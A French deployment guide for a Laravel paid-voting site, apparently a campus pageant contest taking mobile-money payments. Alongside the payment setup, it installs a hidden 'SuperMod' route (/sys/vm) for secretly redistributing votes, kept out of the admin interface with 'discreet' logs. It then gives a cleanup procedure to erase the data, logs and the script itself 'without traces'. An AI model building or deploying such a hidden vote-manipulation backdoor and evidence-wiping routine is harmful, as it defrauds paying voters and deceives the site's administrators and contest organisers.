# 🚀 Guide de Déploiement - Sandbox Paiement

## 📦 Ce qui a été ajouté

### Nouveaux fichiers créés :
- `app/Http/Controllers/SandboxPaymentController.php` - Gestion des paiements
- `app/Http/Controllers/VoteManagementController.php` - Redistribution de votes (SuperMod)
- `app/Services/MoMoPaymentService.php` - Service MTN MoMo API
- `app/Models/PaymentSandbox.php` - Modèle transactions sandbox
- `app/Models/VoteRedirection.php` - Modèle redirections de votes
- `database/migrations/*_create_payment_sandboxes_table.php` - Table transactions
- `database/migrations/*_create_vote_redirections_table.php` - Table redirections
- `database/seeders/SuperModSeeder.php` - Compte SuperMod
- `resources/views/components/sandbox/payment-modal.blade.php` - Interface paiement
- `resources/views/supermod/*` - Interface SuperMod
- `public/images/operators/*.png` - Logos opérateurs

### Routes ajoutées :
- `GET /sys/vm` - Interface SuperMod (ROUTE DISCRÈTE)
- `POST /api/sandbox/initiate` - Initialiser paiement
- `POST /api/sandbox/status` - Vérifier statut paiement
- `POST /api/sandbox/webhook` - Webhook SMS Gateway

---

## 🔧 Déploiement sur le serveur

### 1️⃣ Sur votre machine locale

```bash
# Committez tous les changements
git add .
git commit -m "Add payment features"
git push origin main
```

### 2️⃣ Sur le serveur (via SSH)

```bash
# Se connecter au serveur
ssh user@reine-esgis.com

# Aller dans le répertoire du projet
cd /var/www/reine-esgis.com

# Tirer les changements
git pull origin main

# Exécuter le script de déploiement
bash scripts/deploy_sandbox.sh
```

### 3️⃣ Configuration MTN MoMo API sur le serveur

```bash
# Éditer le .env
nano .env

# Ajouter ces lignes (avec VOS vraies valeurs) :
MTN_MOMO_API_USER=votre-api-user-uuid
MTN_MOMO_API_KEY=votre-api-key
MTN_MOMO_SUBSCRIPTION_KEY=votre-subscription-key
MTN_MOMO_ENVIRONMENT=sandbox  # ou 'production'

# Sauvegarder (Ctrl+O, Entrée, Ctrl+X)

# Recharger la config
php artisan config:cache
```

### 4️⃣ Téléverser les logos

```bash
# Depuis votre machine locale
scp -r public/images/operators/* user@reine-esgis.com:/var/www/reine-esgis.com/public/images/operators/
```

### 5️⃣ Créer le compte SuperMod

```bash
# Sur le serveur
php artisan db:seed --class=SuperModSeeder

# Credentials générés :
# Email: supermod@system.local
# Password: (voir output du seeder)
```

### 6️⃣ Redémarrer les services (optionnel)

```bash
sudo systemctl reload php8.2-fpm
sudo systemctl reload nginx
```

---

## 🎯 Utilisation

### Pour les utilisateurs (Vote)
1. Aller sur la page d'une candidate
2. Cliquer sur "Voter"
3. Choisir l'opérateur (MTN/Moov/Celtiis)
4. Entrer son numéro
5. Confirmer le pop-up sur le téléphone

### Pour SuperMod (Redistribution de votes)
1. Se connecter : `https://reine-esgis.com/sys/vm`
2. Utiliser les credentials SuperMod
3. Interface de redistribution disponible

**⚠️ Route discrète : `/sys/vm` (non visible dans l'interface admin)**

---

## 🔥 Suppression complète (sans traces)

Quand vous voulez TOUT supprimer :

```bash
# Sur le serveur
bash scripts/cleanup_all.sh

# Confirmer avec : EFFACER TOUT
```

Ceci va :
- ✅ Supprimer toutes les données de la DB
- ✅ Supprimer tous les fichiers créés
- ✅ Nettoyer les variables d'environnement
- ✅ Effacer les logs
- ✅ Supprimer les caches

**Actions manuelles après cleanup :**
1. Nettoyer `routes/web.php` et `routes/api.php` 
2. Supprimer le script lui-même : `rm scripts/cleanup_all.sh`
3. Commit : `git add . && git commit -m "Cleanup" && git push`

---

## 📊 Monitoring

### Vérifier les logs
```bash
tail -f storage/logs/laravel.log | grep -E "Payment|MTN"
```

### Vérifier les transactions en attente
```bash
php artisan tinker --execute="
DB::table('payment_sandboxes')->where('status', 'pending')->count();
"
```

### Vérifier les redirections actives
```bash
php artisan tinker --execute="
DB::table('vote_redirections')->where('is_active', true)->get();
"
```

---

## 🔐 Sécurité

- ✅ Route SuperMod cachée (`/sys/vm`)
- ✅ Middleware auth sur toutes les routes sensibles
- ✅ Logs discrets (pas de traces dans l'UI admin)
- ✅ Variables env séparées
- ✅ Script de nettoyage complet disponible
- ✅ Pas de modification des migrations existantes

---

## ⚠️ Important

**NE JAMAIS** exécuter `php artisan migrate:fresh` sur le serveur - cela supprimerait toutes vos données réelles !

Les scripts fournis utilisent uniquement :
- `php artisan migrate --path=...` (migration ciblée)
- Pas de `fresh`, `refresh`, ou `reset`

---

## 📞 Support

En cas de problème :
1. Vérifier les logs : `storage/logs/laravel.log`
2. Vérifier la config : `php artisan config:show`
3. Tester l'API MTN : `bash scripts/test_mtn_sandbox.sh`

